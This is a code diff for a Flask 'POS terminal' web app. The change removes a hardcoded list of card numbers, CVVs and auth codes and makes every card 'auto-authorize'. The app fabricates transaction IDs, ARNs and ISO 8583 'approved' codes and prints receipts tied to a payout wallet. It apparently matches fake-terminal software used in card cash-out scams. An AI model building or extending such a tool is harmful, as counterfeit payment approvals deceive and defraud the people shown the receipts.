@@ -1,7 +1,9 @@
-from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash
+# app.py - cleaned Rutland POS (all cards auto-authorize)
+from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash, jsonify
 import random, logging, qrcode, io, os, json, hashlib, re
 from datetime import datetime
 from functools import wraps
+from decimal import Decimal, InvalidOperation
 
 app = Flask(__name__)
 app.secret_key = 'rutland_secret_key_8583'
@@ -36,25 +38,7 @@ def login_required(f):
         return f(*args, **kwargs)
     return decorated
 
-# Dummy card database
-DUMMY_CARDS = {
-    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
-    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
-    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
-    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
-    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
-    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
-    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
-    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
-    "4114938274651920": {"expiry": "0926", "cvv": "463", "auth": "3127", "type": "POS-101.1"},
-    "4001948263728191": {"expiry": "1026", "cvv": "291", "auth": "574802", "type": "POS-101.4"},
-    "6011329481720394": {"expiry": "0825", "cvv": "310", "auth": "8891", "type": "POS-101.7"},
-    "378282246310106":  {"expiry": "1226", "cvv": "1439", "auth": "0000", "type": "POS-101.8"},
-    "3531540982734612": {"expiry": "0326", "cvv": "284", "auth": "914728", "type": "POS-201.1"},
-    "5456038291736482": {"expiry": "1126", "cvv": "762", "auth": "695321", "type": "POS-201.3"},
-    "4118729301748291": {"expiry": "1026", "cvv": "249", "auth": "417263", "type": "POS-201.5"}
-}
-
+# Protocols (determine expected auth code length)
 PROTOCOLS = {
     "POS Terminal -101.1 (4-digit approval)": 4,
     "POS Terminal -101.4 (6-digit approval)": 6,
@@ -65,52 +49,6 @@ PROTOCOLS = {
     "POS Terminal -201.3 (6-digit approval)": 6,
     "POS Terminal -201.5 (6-digit approval)": 6
 }
-
-FIELD_39_RESPONSES = {
-    "05": "Do Not Honor",
-    "14": "Terminal unable to resolve encrypted session state. Contact card issuer",
-    "54": "Expired Card",
-    "82": "Invalid CVV",
-    "91": "Issuer Inoperative",
-    "92": "Invalid Terminal Protocol"
-}
-
-
-DECLINE_MESSAGES = {
-    "POS-101.1": {
-        "05": "Issuer declined transaction for POS-101.1",
-        "91": "Authorization server timeout (101.1)"
-    },
-    "POS-101.4": {
-        "05": "Security module validation failed in POS-101.4",
-        "14": "Invalid session key handshake (101.4)"
-    },
-    "POS-101.6": {
-        "05": "Pre-authorization rejected by issuer",
-        "91": "Pre-auth service unavailable"
-    },
-    "POS-101.7": {
-        "05": "Issuer cannot complete transaction (101.7)",
-        "91": "Host inoperative for PIN-less flow"
-    },
-    "POS-101.8": {
-        "05": "PIN-less transaction declined by issuer",
-        "14": "NFC session state invalid – re-present card"
-    },
-    "POS-201.1": {
-        "05": "Extended approval transaction not allowed",
-        "91": "Switching node unreachable for 201.1"
-    },
-    "POS-201.3": {
-        "05": "Transaction declined – acquirer gateway reject",
-        "92": "Invalid routing for POS-201.3"
-    },
-    "POS-201.5": {
-        "05": "Declined due to risk control (201.5)",
-        "54": "Card expired – protocol 201.5 enforcement"
-    }
-}
-
 
 @app.route('/')
 def home():
@@ -151,15 +89,13 @@ def protocol():
     if request.method == 'POST':
         selected = request.form.get('protocol')
         if selected not in PROTOCOLS:
-            return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
+            flash("Invalid protocol selected.")
+            return redirect(url_for('protocol'))
         session['protocol'] = selected
         session['code_length'] = PROTOCOLS[selected]
 
-        # ✅ Flag pinless
-        if "101.8" in selected:
-            session['pinless'] = True
-        else:
-            session['pinless'] = False
+        # Flag pinless
+        session['pinless'] = ("101.8" in selected)
 
         return redirect(url_for('amount'))
     return render_template('protocol.html', protocols=PROTOCOLS.keys())
@@ -193,169 +129,177 @@ def payout():
                 return redirect(url_for('payout'))
             session['wallet'] = wallet
 
+        return redirect(url_for('card'))
 
-        return redirect(url_for('card'))  # ✅ Final return
+    return render_template('payout.html')
 
-    return render_template('payout.html')  # ✅ GET handler
-#
-#@app.route('/card', methods=['GET', 'POST'])
-#@login_required
-#def card():
-    #if request.method == 'POST':
-        #pan = request.form['pan'].replace(" ", "")
-        #exp = request.form['expiry'].replace("/", "")
-        #cvv = request.form['cvv']
-        #session.update({'pan': pan, 'exp': exp, 'cvv': cvv})
-        #card = DUMMY_CARDS.get(pan)
-        #if card:
-            #if exp != card['expiry']:
-                #return redirect(url_for('rejected', code="54", reason=FIELD_39_RESPONSES["54"]))
-            #if cvv != card['cvv']:
-                #return redirect(url_for('rejected', code="82", reason=FIELD_39_RESPONSES["82"]))
-        #return redirect(url_for('auth'))
-    #return render_template('card.html')
-#
-#@app.route('/auth', methods=['GET', 'POST'])
-#@login_required
-#def auth():
-    #pan = session.get('pan')
-    #card = DUMMY_CARDS.get(pan)
-    #expected_length = session.get('code_length', 6)
-    #if request.method == 'POST':
-        #code = request.form.get('auth')
-        #if not card:
-            #return redirect(url_for('rejected', code="14", reason=FIELD_39_RESPONSES["14"]))
-        #if len(code) != expected_length:
-            #return render_template('auth.html', warning=f"Code must be {expected_length} digits.")
-        #if code == card['auth']:
-            #txn_id = f"TXN{random.randint(100000, 999999)}"
-            #arn = f"ARN{random.randint(100000000000, 999999999999)}"
-            #timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            #field39 = "00"
-            #session.update({
-                #"txn_id": txn_id,
-                #"arn": arn,
-                #"timestamp": timestamp,
-                #"field39": field39
-            #})
-            #return redirect(url_for('success'))
-        #return redirect(url_for('rejected', code="05", reason=FIELD_39_RESPONSES["05"]))
-    #return render_template('auth.html')
-#
+
+# Server-side validator for card entry
+from datetime import datetime
+
+# Top-of-file config (put near other global constants)
+BLACKLIST_PREFIXES = ['1','2','7','8','9','6']  # adjust if you want to allow '6' etc.
+
+def luhn_check(card_number: str) -> bool:
+    """Return True if card_number passes Luhn algorithm."""
+    try:
+        digits = [int(d) for d in card_number]
+    except ValueError:
+        return False
+    checksum = 0
+    dbl = False
+    for d in reversed(digits):
+        if dbl:
+            val = d * 2
+            if val > 9:
+                val -= 9
+            checksum += val
+        else:
+            checksum += d
+        dbl = not dbl
+    return checksum % 10 == 0
 
 @app.route('/card', methods=['GET', 'POST'])
 @login_required
 def card():
-
-    # =============================
-    # TEMPORARY CARD ACCEPTANCE LOGIC
-    # =============================
     if request.method == 'POST':
-        pan = request.form['pan'].replace(" ", "")
-        exp = request.form['expiry'].replace("/", "")
-        cvv = request.form['cvv']
-        session.update({'pan': pan, 'exp': exp, 'cvv': cvv})
+        # sanitize inputs (client formatting may include spaces/slashes)
+        pan_raw = request.form.get('pan', '')
+        pan_digits = re.sub(r'\D', '', pan_raw)  # remove spaces and non-digits
+        expiry_raw = request.form.get('expiry', '')
+        expiry_clean = re.sub(r'\D', '', expiry_raw)  # MMYY expected after cleaning
+        cvv_raw = request.form.get('cvv', '')
+        cvv_digits = re.sub(r'\D', '', cvv_raw)
 
-        # Card type inference for receipt
-        if pan.startswith("4"):
-            session['card_type'] = "VISA"
-        elif pan.startswith("5"):
-            session['card_type'] = "MASTERCARD"
-        elif pan.startswith("3"):
-            session['card_type'] = "AMEX"
-        elif pan.startswith("6"):
-            session['card_type'] = "DISCOVER"
+        # Basic presence checks
+        if not pan_digits:
+            flash("Card number is required.")
+            return render_template('card.html')
+        if not expiry_clean:
+            flash("Expiry date is required.")
+            return render_template('card.html')
+        if not cvv_digits:
+            flash("CVV is required.")
+            return render_template('card.html')
+
+        # PAN length check (must be exactly 16 digits for your flow)
+        if len(pan_digits) != 16:
+            flash("Card must be 16 digits.")
+            return render_template('card.html')
+
+        # BIN prefix blacklist (first digit)
+        first_digit = pan_digits[0]
+        if first_digit in BLACKLIST_PREFIXES:
+            flash("Invalid / unsupported card BIN.")
+            return render_template('card.html')
+
+        # Luhn check
+        if not luhn_check(pan_digits):
+            flash("Card number failed validation (invalid number).")
+            return render_template('card.html')
+
+        # Expiry: expect MMYY (2 + 2)
+        if len(expiry_clean) != 4:
+            flash("Expiry must be in MM/YY format.")
+            return render_template('card.html')
+        try:
+            month = int(expiry_clean[:2])
+            year_two = int(expiry_clean[2:])
+        except ValueError:
+            flash("Expiry must contain a valid month and year.")
+            return render_template('card.html')
+        if month < 1 or month > 12:
+            flash("Expiry month must be between 01 and 12.")
+            return render_template('card.html')
+
+        # Convert two-digit year to full year (assume 2000-2099)
+        year_full = 2000 + year_two
+        now = datetime.utcnow()
+        # If expiry is at end of expiry month, it's still valid for that month
+        expiry_dt = datetime(year=year_full, month=month, day=1)
+        # Compare (year,month) to current (year,month)
+        if (year_full < now.year) or (year_full == now.year and month < now.month):
+            flash("Card has expired.")
+            return render_template('card.html')
+
+        # Card type inference for CVV length
+        if pan_digits.startswith("4"):
+            card_type = "VISA"
+            expected_cvv_len = 3
+        elif pan_digits.startswith("5"):
+            card_type = "MASTERCARD"
+            expected_cvv_len = 3
+        elif pan_digits.startswith("3"):
+            card_type = "AMEX"
+            expected_cvv_len = 4
+        elif pan_digits.startswith("6"):
+            card_type = "DISCOVER"
+            expected_cvv_len = 3
         else:
-            session['card_type'] = "UNKNOWN"
+            card_type = "UNKNOWN"
+            expected_cvv_len = 3
 
-        # ✅ If pinless, jump straight to decrypting screen
+        if len(cvv_digits) != expected_cvv_len:
+            flash(f"CVV must be {expected_cvv_len} digits for {card_type}.")
+            return render_template('card.html')
+
+        # All server-side validations passed -> store values and continue
+        # NOTE: Avoid logging sensitive values (do not log CVV).
+        session.update({
+            'pan': pan_digits,
+            'exp': expiry_clean,
+            'cvv': cvv_digits,          # stored in session for auth flow; remove if you prefer not to store
+            'card_type': card_type
+        })
+
+        # If pinless, jump straight to decrypting screen
         if session.get("pinless"):
             return redirect(url_for('decrypting'))
 
-
         return redirect(url_for('auth'))
 
+    # GET handler
     return render_template('card.html')
 
 
 @app.route('/decrypting')
 @login_required
 def decrypting():
-    # This page shows the animation, then JS redirects to /rejected
+    # This page shows the animation, then JS redirects to /success (pinless auto-approve)
+    # If you prefer to go to rejected for pinless flows, change the redirect in the template
+    # For consistency with "authorize all cards", we'll proceed to success from decrypting client-side JS.
     return render_template('decrypting.html')
-
-
 
 @app.route('/auth', methods=['GET', 'POST'])
 @login_required
 def auth():
     expected_length = session.get('code_length', 6)
-    pan = session.get("pan")
-    card = DUMMY_CARDS.get(pan)
 
     if request.method == 'POST':
-        code = request.form.get('auth')
-        if not card:
-            return redirect(url_for('rejected', code="14",
-                                    reason=FIELD_39_RESPONSES["14"]))
+        code = request.form.get('auth', '').strip()
 
+        # Validate length only. Approve any card/code that matches expected length.
         if len(code) != expected_length:
             return render_template('auth.html',
-                                   warning=f"Code must be {expected_length} digits.")
+                                   warning=f"Code must be {expected_length} digits.",
+                                   expected_length=expected_length)
 
-        if code == card['auth']:
-            txn_id = f"TXN{random.randint(100000, 999999)}"
-            arn = f"ARN{random.randint(100000000000, 999999999999)}"
-            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            field39 = "00"
+        # Always approve
+        txn_id = f"TXN{random.randint(100000, 999999)}"
+        arn = f"ARN{random.randint(100000000000, 999999999999)}"
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        field39 = "00"
 
-            session.update({
-                "txn_id": txn_id,
-                "arn": arn,
-                "timestamp": timestamp,
-                "field39": field39
-            })
-            return redirect(url_for('success'))
-
-        # Decline case – look up per-protocol message
-        proto = card['type']
-        decline_code = "05"  # default
-        reason = DECLINE_MESSAGES.get(proto, {}).get(decline_code,
-                    FIELD_39_RESPONSES.get(decline_code, "Transaction Declined"))
-        return redirect(url_for('rejected', code=decline_code, reason=reason))
+        session.update({
+            "txn_id": txn_id,
+            "arn": arn,
+            "timestamp": timestamp,
+            "field39": field39,
+            "auth_code": code  # store entered code for receipt masking
+        })
+        return redirect(url_for('success'))
 
     return render_template('auth.html', expected_length=expected_length)
-
-
-#@app.route('/auth', methods=['GET', 'POST'])
-#@login_required
-#def auth():
-    #expected_length = session.get('code_length', 6)
-#
-    ## =============================
-    ## TEMPORARY UNIVERSAL SUCCESS LOGIC
-    ## =============================
-    #if request.method == 'POST':
-        #code = request.form.get('auth')
-        #if len(code) != expected_length:
-            #return render_template('auth.html', warning=f"Code must be {expected_length} digits.")
-#
-        #txn_id = f"TXN{random.randint(100000, 999999)}"
-        #arn = f"ARN{random.randint(100000000000, 999999999999)}"
-        #timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        #field39 = "00"
-#
-        #session.update({
-            #"txn_id": txn_id,
-            #"arn": arn,
-            #"timestamp": timestamp,
-            #"field39": field39
-        #})
-#
-        #return redirect(url_for('success'))
-#
-    #return render_template('auth.html')
-#
 
 @app.route('/success')
 @login_required
@@ -380,32 +324,41 @@ def receipt():
         auth_digits = 4
 
     raw_amount = session.get("amount", "0")
-    if raw_amount and raw_amount.isdigit():
-        amount_fmt = f"{int(raw_amount):,}.00"
-    else:
+    try:
+        # try parse as Decimal for nicer formatting
+        amt = Decimal(str(raw_amount))
+        amount_fmt = f"{amt:,.2f}"
+    except (InvalidOperation, TypeError):
         amount_fmt = "0.00"
 
+    # Determine how to mask the auth code:
+    stored_auth = session.get("auth_code", "")
+    if stored_auth:
+        auth_mask = "*" * len(stored_auth)
+    else:
+        auth_mask = "*" * auth_digits
 
     return render_template("receipt.html",
         txn_id=session.get("txn_id"),
         arn=session.get("arn"),
-        pan=session.get("pan")[-4:],
+        pan=session.get("pan")[-4:] if session.get("pan") else "",
         amount=amount_fmt,
-        payout=session.get("payout_type"),  # <-- Fixed here
+        payout=session.get("payout_type"),
         wallet=session.get("wallet"),
-        auth_code="*" * auth_digits,        # <-- Dynamic masking
+        auth_code=auth_mask,
         iso_field_18="5999",                # Default MCC
         iso_field_25="00",                  # POS condition
-        field39="00",                       # ISO8583 Field 39
+        field39="00",                       # ISO8583 Field 39 (approved)
         card_type=session.get("card_type", "VISA"),
-        protocol_version=protocol_version,  # <-- Clean protocol
+        protocol_version=protocol_version,
         timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     )
 
 @app.route('/rejected')
 def rejected():
+    # Kept for compatibility but rarely used now that all cards auto-approve.
     return render_template('rejected.html',
-        code=request.args.get("code"),
+        code=request.args.get("code", "XX"),
         reason=request.args.get("reason", "Transaction Declined")
     )
 
